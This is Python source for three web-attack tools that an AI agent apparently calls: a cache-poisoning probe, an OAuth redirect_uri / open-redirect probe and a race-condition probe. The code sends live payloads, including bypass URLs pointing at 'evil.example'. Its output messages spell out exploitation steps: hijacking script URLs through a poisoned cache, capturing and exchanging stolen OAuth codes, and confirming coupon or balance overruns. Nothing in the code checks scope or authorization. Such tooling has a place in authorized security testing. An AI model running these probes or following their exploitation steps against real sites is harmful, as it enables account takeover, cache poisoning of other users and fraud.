class CachePoisonTool(_WebToolBase):
    """Probe for web cache poisoning: send unkeyed headers (X-Forwarded-Host, X-Host, ...)
    with a marker + cache-buster and flag any reflected into a CACHEABLE response."""

    name = "cache_poison"
    description = (
        "Probe for web cache poisoning. Sends unkeyed headers (X-Forwarded-Host, X-Host, "
        "X-Forwarded-Scheme, X-Original-URL, ...) with a marker + cache-buster and flags "
        "any reflected into a response that also looks cacheable (Cache-Control public / "
        "Age / X-Cache) - the setup for poisoning the shared cache. Give `url`."
    )
    parameters = {
        "type": "object",
        "properties": {"url": {"type": "string", "description": "The (ideally cached) URL."}},
        "required": ["url"],
    }
    permissions = {Permission.NETWORK}
    timeout = 30
    tags = ["web", "cache-poisoning", "misconfig"]

    _HEADERS = ["X-Forwarded-Host", "X-Host", "X-Forwarded-Scheme", "X-Forwarded-Server",
                "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Prefix"]
    _MARK = "cpwn9147.evil"

    async def execute(self, url: str, **kwargs: Any) -> ToolResult:
        url = (url or "").strip()
        if not url:
            return ToolResult.fail("cache_poison: 'url' is required")
        rows: list[str] = []
        candidates: list[str] = []
        try:
            async with self._client() as client:
                for hdr in self._HEADERS:
                    sep = "&" if "?" in url else "?"
                    resp = await client.get(url + sep + f"cb={int(time.time()*1000)}{hdr}",
                                            extra_headers={hdr: self._MARK, "User-Agent": _UA})
                    body = resp.text or ""
                    h = {k.lower(): v for k, v in (resp.headers or {}).items()}
                    reflected = self._MARK in body
                    cacheable = ("public" in h.get("cache-control", "").lower()
                                 or "age" in h or "x-cache" in h)
                    mark = ""
                    if reflected and cacheable:
                        mark = "  <-- REFLECTED into a CACHEABLE response (poisoning candidate)"
                        candidates.append(hdr)
                    elif reflected:
                        mark = "  <-- reflected (confirm it caches)"
                    rows.append(f"  {hdr:22} -> reflected={reflected} cacheable={cacheable}{mark}")
        except Exception as exc:
            return ToolResult.fail(f"cache_poison: request failed - {exc}")

        header = f"cache_poison - {url}\n" + "\n".join(rows)
        if candidates:
            return ToolResult.ok(
                header + "\n\nCACHE POISONING CANDIDATE (" + ", ".join(candidates) + "): "
                "unkeyed AND reflected into a cacheable response. Poison it (e.g. "
                "X-Forwarded-Host -> your host to hijack absolute script URLs), then "
                "confirm a cache HIT serves it to others.",
                metadata={"url": url, "candidates": candidates})
        return ToolResult.ok(header + "\n\nNo unkeyed-header reflection into a cacheable "
                             "response.", metadata={"url": url, "candidates": []})


# --------------------------------------------------------------------------- #
# OAuth / open redirect
# --------------------------------------------------------------------------- #

class OauthProbeTool(_WebToolBase):
    """Probe a redirect/authorize URL for open-redirect and OAuth redirect_uri bypass: a
    redirect the server follows to an attacker origin leaks the auth code/token."""

    name = "oauth_probe"
    description = (
        "Test a redirect/authorize URL for open-redirect and OAuth redirect_uri bypass. "
        "Rewrites the redirect target with attacker payloads (host swap, subdomain, "
        "@userinfo, //evil, backslash, traversal) and flags a 3xx Location (or reflected "
        "redirect) to the attacker origin. Give `url` and the `param` holding the redirect "
        "(redirect_uri/redirect/next/returnUrl/callback)."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "The authorize/redirect URL."},
            "param": {"type": "string", "description": "The redirect param."},
        },
        "required": ["url", "param"],
    }
    permissions = {Permission.NETWORK}
    timeout = 30
    tags = ["web", "oauth", "open-redirect"]

    _EVIL = "evil.example"

    def _payloads(self, url: str, param: str) -> list:
        legit = dict(urllib.parse.parse_qsl(urllib.parse.urlsplit(url).query)).get(param, "")
        host = urllib.parse.urlsplit(legit or "https://target").netloc or "target"
        e = self._EVIL
        return [
            ("whole-swap", f"https://{e}/cb"),
            ("subdomain", f"https://{host}.{e}/cb"),
            ("userinfo", f"https://{host}@{e}/cb"),
            ("protocol-relative", f"//{e}/cb"),
            ("backslash", f"https://{e}\\@{host}/cb"),
            ("traversal", f"https://{host}/../../{e}"),
        ]

    async def execute(self, url: str, param: str, **kwargs: Any) -> ToolResult:
        url = (url or "").strip()
        param = (param or "").strip()
        if not url or not param:
            return ToolResult.fail("oauth_probe: 'url' and 'param' are required")
        rows: list[str] = []
        vulns: list[str] = []
        try:
            async with HttpClient(timeout=12.0, proxy=self._proxy(),
                                  cookies=getattr(self.session, "cookies", None),
                                  headers={"User-Agent": _UA}, verify_ssl=False,
                                  follow_redirects=False) as client:
                for label, payload in self._payloads(url, param):
                    resp = await client.get(self._inject(url, param, payload),
                                            extra_headers={"User-Agent": _UA})
                    loc = {k.lower(): v for k, v in (resp.headers or {}).items()}.get("location", "")
                    to_evil = self._EVIL in loc
                    reflected = self._EVIL in (resp.text or "")[:4000]
                    mark = ""
                    if to_evil:
                        mark, _ = f"  <-- OPEN REDIRECT: Location -> {loc[:50]}", vulns.append(label)
                    elif reflected:
                        mark = "  <-- payload reflected (client-side redirect?)"
                    rows.append(f"  {label:18} -> {resp.status_code} "
                                f"loc={loc[:32] or '(none)'}{mark}")
        except Exception as exc:
            return ToolResult.fail(f"oauth_probe: request failed - {exc}")

        header = f"oauth_probe - {url} (param={param})\n" + "\n".join(rows)
        if vulns:
            return ToolResult.ok(
                header + "\n\nREDIRECT_URI / OPEN REDIRECT ACCEPTED (" + ", ".join(vulns) +
                "): redirects to the attacker origin. In OAuth this leaks the code/token "
                "(set redirect_uri to your server, capture the code, exchange it).",
                metadata={"url": url, "vulnerable": vulns})
        return ToolResult.ok(header + "\n\nNo open-redirect / redirect_uri bypass observed.",
                             metadata={"url": url, "vulnerable": []})


# --------------------------------------------------------------------------- #
# Race condition
# --------------------------------------------------------------------------- #

class RaceProbeTool(_WebToolBase):
    """Probe for a race condition (limit-overrun / TOCTOU): fire N identical requests
    near-simultaneously and detect more successes than a single-use action should allow."""

    name = "race_probe"
    description = (
        "Test for a race condition by firing N identical requests near-simultaneously and "
        "reporting the response spread. More 2xx successes than the logic should allow "
        "(coupon reuse, double-spend, one-time-token replay) indicates an exploitable "
        "race. Give `url`, `method` (POST/GET), `body` (JSON), `count` (default 20)."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "The action endpoint."},
            "method": {"type": "string", "enum": ["POST", "GET"], "default": "POST"},
            "body": {"type": "object", "description": "JSON body for POST (optional)."},
            "count": {"type": "integer", "description": "Concurrent requests (default 20, max 50).", "default": 20},
        },
        "required": ["url"],
    }
    permissions = {Permission.NETWORK}
    timeout = 40
    tags = ["web", "race-condition", "exploit"]

    async def execute(self, url: str, method: str = "POST", body: Optional[dict] = None,
                      count: int = 20, **kwargs: Any) -> ToolResult:
        url = (url or "").strip()
        if not url:
            return ToolResult.fail("race_probe: 'url' is required")
        method = (method or "POST").upper()
        n = min(max(2, count), 50)
        try:
            async with self._client(timeout=20.0) as client:
                async def _one():
                    r = (await client.post(url, json=body or {}, extra_headers={"User-Agent": _UA})
                         if method == "POST"
                         else await client.get(url, extra_headers={"User-Agent": _UA}))
                    return (r.status_code, len(r.text or ""))
                results = await asyncio.gather(*[_one() for _ in range(n)],
                                               return_exceptions=True)
        except Exception as exc:
            return ToolResult.fail(f"race_probe: failed - {exc}")

        from collections import Counter
        ok = [r for r in results if isinstance(r, tuple)]
        by_status = Counter(s for s, _ in ok)
        successes = sum(c for s, c in by_status.items() if 200 <= s < 300)
        distinct = len(Counter(ok))
        lines = [f"race_probe - {n} concurrent {method} to {url}",
                 "  status distribution: " + ", ".join(f"{s}x{c}" for s, c in by_status.items()),
                 f"  2xx successes: {successes}/{n}   distinct responses: {distinct}"]
        race = distinct > 1 and successes >= 2
        if race:
            lines.append("\n  <-- RACE SIGNAL: some concurrent requests succeeded while "
                         "others were rejected. If the action must be single-use "
                         "(coupon/one-time token/balance), confirm the side effect applied "
                         "more than once - that is an exploitable overrun.")
        else:
            lines.append("\n  No clear race signal (uniform responses). Retry with a higher "
                         "count or a fresh single-use token.")
        return ToolResult.ok("\n".join(lines),
                             metadata={"url": url, "successes": successes,
                                       "distinct": distinct, "race": race})
